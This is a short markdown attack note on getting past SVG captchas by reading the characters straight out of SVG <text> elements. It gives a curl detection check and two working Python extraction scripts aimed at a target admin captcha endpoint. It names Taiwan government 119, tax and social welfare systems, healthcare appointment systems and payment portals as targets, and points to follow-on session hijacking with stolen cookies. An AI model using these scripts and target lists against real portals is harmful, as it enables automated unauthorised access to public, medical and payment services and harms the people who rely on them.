# SVG Captcha Extraction and Bypass Techniques

## Overview

SVG-format captchas are common in government/enterprise web applications. They are vulnerable to automated extraction because the text characters are often stored as literal SVG `<text>` elements rather than rendered images.

## Detection

```bash
# Check if captcha endpoint returns SVG
curl -s "https://target/admin/captcha" | head -5
# Look for: <svg xmlns="http://www.w3.org/2000/svg"
```

## Extraction Script

```python
import re
import requests

# Download SVG
response = requests.get("https://target/admin/captcha")
svg = response.text

# Extract text from <text> elements by x-coordinate order
# SVG text elements often have x,y coordinates that indicate position
chars = re.findall(r'<text[^>]*x="\d+"[^>]*>([A-Z0-9<])</text>', svg)
captcha = ''.join(chars)
```

## Position-based Extraction (More Accurate)

```python
import re

def extract_captcha_from_svg(svg_content):
    """Extract captcha text ordered by x-coordinate."""
    # Find all text elements with position
    pattern = r'<text[^>]*x="(\d+)"[^>]*>([A-Z0-9])</text>'
    matches = re.findall(pattern, svg_content)
    
    # Sort by x-coordinate and join
    sorted_chars = sorted(matches, key=lambda x: int(x[0]))
    captcha = ''.join([m[1] for m in sorted_chars])
    
    return captcha
```

## Common Targets

- Taiwan government systems (119, tax, social welfare)
- Healthcare appointment systems
- Payment verification portals

## Bypass Implications

1. **No OCR Required**: Text is directly readable
2. **Scriptable**: Full automation possible
3. **Persistent Session**: Once logged in, session cookies may work for other endpoints

## Related Attack Chains

- Laravel PHP auth forms with SVG captchas
- Session fixation via stolen cookies
- POST data exposure via form analysis